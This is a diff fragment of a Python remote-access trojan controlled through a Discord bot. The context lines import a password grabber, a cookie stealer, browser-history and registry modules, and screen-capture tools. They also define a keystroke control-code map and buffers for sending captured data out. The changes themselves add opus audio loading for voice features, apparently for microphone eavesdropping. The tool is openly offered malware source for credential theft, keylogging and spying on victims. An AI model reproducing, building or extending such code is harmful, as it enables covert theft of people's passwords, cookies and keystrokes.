@@ -21,6 +21,7 @@ from scipy.io.wavfile import write
 from browser_history import get_history
 from threading import Thread
 import winreg
+import struct
 import pyautogui
 from resources.misc import *
 from resources.passwords_grabber import *
@@ -38,7 +39,6 @@ from resources.get_cookies import *
 ##   Everything you do, you are doing at your own risk and responsibility.   ##
 ##                                                                           ##
 ###############################################################################
-
 
 # ----------- Begin of config ---------- #
 # - Please check out README.md before  - #     ! It is recommended to use compiler.py for building executable !
@@ -66,7 +66,14 @@ guild_id = None
 # - you know exacly what are you doing - #
 # -------------------------------------- #
 
+
 client = discord.Client(intents=discord.Intents.all())
+
+bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
+opuslib_path = os.path.abspath(os.path.join(bundle_dir, './libopus-0.x64.dll'))
+
+discord.opus.load_opus(opuslib_path)
+    
 ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
 text_buffor, force_to_send = '', False
 messages_to_send, files_to_send, embeds_to_send = [], [], []
